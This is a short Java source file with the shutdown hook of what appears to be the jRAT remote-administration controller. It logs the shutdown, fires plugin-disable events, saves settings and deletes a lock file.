package io.jrat.controller;

import io.jrat.common.Logger;
import io.jrat.controller.settings.AbstractStorable;
import io.jrat.controller.settings.Settings;
import jrat.api.events.Event;
import jrat.api.events.EventType;
import jrat.api.events.OnDisableEvent;

public class ShutdownHook implements Runnable {

	@Override
	public void run() {
		Logger.log("Shutting down...");
		
		OnDisableEvent event = new OnDisableEvent();
		for (Event e : Event.getHandler().getEvents(EventType.EVENT_PLUGIN_DISABLE)) {
			e.perform(event);
		}

		AbstractStorable.saveAllGlobals();

		try {
			Settings.getGlobal().save();
		} catch (Exception e) {
			e.printStackTrace();
		}

		Globals.getLockFile().delete();
	}

}
